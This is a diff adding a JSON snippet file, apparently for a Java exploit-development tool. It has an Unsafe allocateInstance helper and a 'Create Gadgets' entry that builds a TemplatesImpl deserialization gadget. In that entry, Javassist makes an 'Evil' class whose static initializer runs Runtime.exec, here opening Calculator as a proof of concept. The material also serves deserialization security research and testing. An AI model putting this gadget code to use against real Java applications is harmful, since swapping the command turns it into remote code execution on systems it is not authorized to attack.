@@ -1,0 +1,44 @@
+{
+  "menuItems": [
+    {
+      "name": "Unsafe Reflector",
+      "subItems": [
+        {
+          "name": "allocateInstance",
+          "code": "    // 创建实例对象（跳过构造方法）\n    public static <T> T allocateInstance(Class<T> cls) throws Exception {\n        Field theUnsafe = Unsafe.class.getDeclaredField(\"theUnsafe\");\n        theUnsafe.setAccessible(true);\n        Unsafe unsafe = (Unsafe) theUnsafe.get(null);\n        return (T) unsafe.allocateInstance(cls);\n    }",
+          "imports": [
+            "sun.misc.Unsafe",
+            "java.lang.reflect.Field"
+          ],
+          "mavenDependencies": [
+          ]
+        }
+      ]
+    },
+    {
+      "name": "Create Gadgets",
+      "subItems": [
+        {
+          "name": "createTemplatesImpl no lib",
+          "code": "// Boolean.parseBoolean(System.getProperty(\"properXalan\", \"false\")) ? createTemplatesImpl(Class.forName(\"org.apache.xalan.xsltc.trax.TemplatesImpl\"), Class.forName(\"org.apache.xalan.xsltc.runtime.AbstractTranslet\"), Class.forName(\"org.apache.xalan.xsltc.trax.TransformerFactoryImpl\")) : createTemplatesImpl( TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);\n    public static <T> T createTemplatesImpl(Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception {\n        T templates = tplClass.getDeclaredConstructor().newInstance();\n\n        ClassPool pool = ClassPool.getDefault();\n        CtClass clas = pool.makeClass(\"Evil\");\n        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));\n        String cmd = \"Runtime.getRuntime().exec(\\\"open -a Calculator\\\");\";\n        clas.makeClassInitializer().insertBefore(cmd);\n        clas.setSuperclass(pool.getCtClass(AbstractTranslet.class.getName()));\n\n        clas.writeFile(\"./\");\n        byte[] clasBytecode = clas.toBytecode();\n\n        // Set fields using reflection\n        Field bytecodesField = templates.getClass().getDeclaredField(\"_bytecodes\");\n        bytecodesField.setAccessible(true);\n        bytecodesField.set(templates, new byte[][]{clasBytecode, clasBytecode});\n\n        Field nameField = templates.getClass().getDeclaredField(\"_name\");\n        nameField.setAccessible(true);\n        nameField.set(templates, \"Pwnr\");\n\n        Field tfactoryField = templates.getClass().getDeclaredField(\"_tfactory\");\n        tfactoryField.setAccessible(true);\n        tfactoryField.set(templates, transFactory.getDeclaredConstructor().newInstance());\n\n        return templates;\n    }",
+          "imports": [
+            "javassist.ClassPool",
+            "javassist.CtClass",
+            "java.io.IOException",
+            "java.io.ByteArrayOutputStream",
+            "java.lang.reflect.Field",
+            "javassist.ClassClassPath",
+            "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"
+          ],
+          "mavenDependencies": [
+            {
+              "groupId": "org.javassist",
+              "artifactId": "javassist",
+              "version": "3.29.0-GA"
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
